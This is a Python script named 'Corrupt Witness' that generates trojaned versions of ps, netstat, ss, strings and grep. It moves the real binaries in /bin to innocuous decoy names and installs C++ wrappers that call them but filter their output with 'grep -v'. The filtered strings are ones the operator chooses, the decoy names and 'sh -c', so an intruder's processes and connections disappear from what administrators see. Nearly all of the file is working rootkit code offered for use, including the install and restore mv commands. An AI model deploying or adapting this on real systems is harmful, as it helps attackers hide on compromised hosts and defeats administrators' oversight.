#!/usr/bin/python
import sys,subprocess,os,getopt,time,random

purple="\033[35m"
default="\033[39m"
red="\033[31m"
green="\33[32m"
yellow="\33[33m"
blue="\33[34m"

def print_banner(flashy):
       
    os.system("clear")
    colors=[red,green,blue,yellow,green,purple,default]
    banner='''
 _____                                   _   
/  __ \                                 | |  
| /  \/  ___   _ __  _ __  _   _  _ __  | |_ 
| |     / _ \ | '__|| '__|| | | || '_ \ | __|
| \__/\| (_) || |   | |   | |_| || |_) || |_ 
 \____/ \___/ |_|   |_|    \__,_|| .__/  \__|
                                 | |         
                                 |_|         
 _    _  _  _                                
| |  | |(_)| |                               
| |  | | _ | |_  _ __    ___  ___  ___       
| |/\| || || __|| '_ \  / _ \/ __|/ __|      
\  /\  /| || |_ | | | ||  __/\__ \\__ \      
 \/  \/ |_| \__||_| |_| \___||___/|___/ 
    '''
    if flashy:
        for x in range (1,3):
            for color in colors:
                os.system("clear")
                print color
                print banner
                time.sleep(.1)
                print default
        print "Coded by Feelz\n\n\n"
        time.sleep(.5)
    else:
        print banner 
        print "Coded by Feelz\n\n\n"


class process:
    enabled=True
    def __init__(self, name):
        self.name = name
    def toggle(self):
        if self.enabled:
            self.enabled=False
        else:
            self.enabled=True    

def ps_build(grep_line,ps_command):
    print green + "[+] Writing ps.cc"
    
    
#Start the OUTPUT
    
    output='''
#include <iostream>
#include <cstdlib>
using namespace std;
int main( int argc, char * argv[] )
{
    string command="%s";
    string space=" ";
    string grepout="%s";
    for (int i=1; i <argc; i++)
    {
        command = command + space + argv[i];
    }

    command+=grepout;
    system((command).c_str());
    return 0;
}

    ''' % (ps_command, grep_line)
#End Output
    f = open("output/ps.cc",'w')
    f.write(output)
    f.close()
    print green + "[+]Compiling ps"
    try:
        subprocess.call(["g++","-o","output/ps","output/ps.cc"])    
    except:
        print red+"[*]ps build failed"
#END of PS Build

def netstat_build(grep_line,netstat_command):
    print green + "[+] Writing netstat.cc"
    
#Start the OUTPUT
    
    output='''
#include <iostream>
#include <cstdlib>
using namespace std;
int main( int argc, char * argv[] )
{
    string command="%s";
    string space=" ";
    string grepout="%s";
    for (int i=1; i <argc; i++)
    {
        command = command + space + argv[i];
    }

    command+=grepout;
    system((command).c_str());
    return 0;
}

    ''' % (netstat_command, grep_line)
#End Output
    f = open("output/netstat.cc",'w')
    f.write(output)
    f.close()
    print green + "[+]Compiling netstat"
    try:
        subprocess.call(["g++","-o","output/netstat","output/netstat.cc"])    
    except:
        print red+"[*]netstat build failed"
#END of netstat Build

def ss_build(grep_line,ss_command):
    print green + "[+] Writing ss.cc"
    
    
#Start the OUTPUT
    
    output='''
#include <iostream>
#include <cstdlib>
using namespace std;
int main( int argc, char * argv[] )
{
    string command="%s";
    string space=" ";
    string grepout="%s";
    for (int i=1; i <argc; i++)
    {
        command = command + space + argv[i];
    }

    command+=grepout;
    system((command).c_str());
    return 0;
}

    ''' % (ss_command, grep_line)
#End Output
    f = open("output/ss.cc",'w')
    f.write(output)
    f.close()
    print green + "[+]Compiling ss"
    try:
        subprocess.call(["g++","-o","output/ss","output/ss.cc"])    
    except:
        print red+"[*]ss build failed"
#END of ss Build

def strings_build(grep_line,strings_command):
    print green + "[+] Writing strings.cc"
    
#Start the OUTPUT
    
    output='''
#include <iostream>
#include <cstdlib>
using namespace std;
int main( int argc, char * argv[] )
{
    string command="%s";
    string space=" ";
    string grepout="%s";
    for (int i=1; i <argc; i++)
    {
        command = command + space + argv[i];
    }

    command+=grepout;
    system((command).c_str());
    return 0;
}

    ''' % (strings_command, grep_line)
#End Output
    f = open("output/strings.cc",'w')
    f.write(output)
    f.close()
    print green + "[+]Compiling strings"
    try:
        subprocess.call(["g++","-o","output/strings","output/strings.cc"])    
    except:
        print red+"[*]strings build failed"
#END of strings Build

def grep_build(grep_line,grep_command):
    print green + "[+] Writing grep.cc"
    
#Start the OUTPUT
    
    output='''
#include <iostream>
#include <cstdlib>
using namespace std;
int main( int argc, char * argv[] )
{
    string command="%s";
    string space=" ";
    string grepout="%s";
    for (int i=1; i <argc; i++)
    {
        command = command + space + argv[i];
    }

    command+=grepout;
    system((command).c_str());
    return 0;
}

    ''' % (grep_command, grep_line)
#End Output
    f = open("output/grep.cc",'w')
    f.write(output)
    f.close()
    print green + "[+]Compiling grep"
    try:
        subprocess.call(["g++","-o","output/grep","output/grep.cc"])    
    except:
        print red+"[*]grep build failed"
#END of grep Build

def main(argv):
    menu_done=False
    binaries = [process('ps'),process('netstat'),process('ss'),process('strings')]
    ps_baks=["systemctlr","ntfscomp","mknodfifo","lnens","zcalc"]
    netstat_baks=["chargeman","exediff","udevmangr","ntfsmapper","opennvtn"]
    ss_baks=["ipingv6","ethermgr","flood","zipcrypt","dirmgr","comparestrs"]
    grep_baks=["keygen-auth","randnum","snooze","revw","zcompare"]
    strings_baks=["uwind","tmpmker","settypefc","linkline","ntfsdistr"]

    num=random.randint(0,4)
    ps_bak=ps_baks[num]
    netstat_bak=netstat_baks[num]
    ss_bak=ss_baks[num]
    grep_bak=grep_baks[num]
    strings_bak=strings_baks[num]

    flashy=True
    print_banner(flashy)
    while not(menu_done):
        flashy=False
        print_banner(flashy)
        print "Toggle the binaries you want to build:\n"
        for x,y in enumerate(binaries):
            if y.enabled:
                print green + str(x+1) + ".  " + y.name + ":Enabled"
                maxchoice=x+1
            else:
                print yellow + str(x+1) + ".  " + y.name + ":Disabled"
                maxchoice=x+1
        maxchoice+=1
        print default + str(maxchoice) + ".  Finished"
        choice=raw_input("\n>>> ")
        try:
            if (int(choice)<1) or (int(choice)>maxchoice):
                print "Invalid Choice..."
                time.sleep(.5)
                continue
        except:
            print "Invalid choice... "
            time.sleep(.5)
            continue
        if int(choice) == maxchoice:
            menu_done=True
        else:
            print maxchoice
            choice=int(choice)
            choice-=1
            binaries[choice].toggle()
        os.system("clear")
    menu_done=False
    while not(menu_done):
        print_banner(flashy) 
        grepout=raw_input("\n\nEnter strings you want to remove from command output, comma seperated.\n\n")
        grepout=grepout.split(",")
        print "\nRemoving the following strings\n"
        for x in grepout:
            print x
        proceed=raw_input("\nProceed with these settings? (Y/N)")
        if proceed.upper()=="Y":
            menu_done=True
        
    
    
    grep_line=" |grep -v 'sh -c'"
    for line in grepout:
        grep_line += "| grep -v " + line
    grep_line += "| grep -v " + ps_bak
    grep_line += "| grep -v " + netstat_bak
    grep_line += "| grep -v " + ss_bak
    grep_line += "| grep -v " + grep_bak
    grep_line += "| grep -v " + strings_bak
    
    move_commands=""
    touch_commands=""
    remove_commands="" 
    f = open("output/install.txt",'w')
    for x in binaries:
        if x.enabled:
            if x.name=='ps':
                ps_build(grep_line,ps_bak)
                move_commands+="mv /bin/ps /bin/" + ps_bak + "\n"
                remove_commands+="mv /bin/" + ps_bak + " /bin/ps\n"
            if x.name=='netstat':
                netstat_build(grep_line,netstat_bak)   
                move_commands+="mv /bin/netstat /bin/" + netstat_bak + "\n"
                remove_commands+="mv /bin/" + netstat_bak + " /bin/netstat\n"
            if x.name=='ss':
                ss_build(grep_line,ss_bak)   
                move_commands+="mv /bin/ss /bin/" + ss_bak + "\n"
                remove_commands+="mv /bin/" + ss_bak + " /bin/ss\n"
            if x.name=='strings':
                strings_build(grep_line,strings_bak)   
                move_commands+="mv /usr/bin/strings /usr/bin/" + strings_bak + "\n"
                remove_commands+="mv /usr/bin/" + strings_bak + " /usr/bin/strings\n"
            if x.name=='grep':
                grep_build(grep_line,grep_bak)   
                move_commands+="mv /bin/grep /bin/" + grep_bak + "\n"
                remove_commands+="mv /bin/" + grep_bak + " /bin/grep\n"
    f = open("output/install.txt",'w')
    f.write(move_commands)
    f.write("\n#upload new binaries\n\n")
    f.write("\n#commands to restore to normal\n")
    f.write(remove_commands)
    f.close()
    time.sleep(1)
    print default
#    print_banner(flashy)


if __name__ == "__main__":
    main(sys.argv[1:])


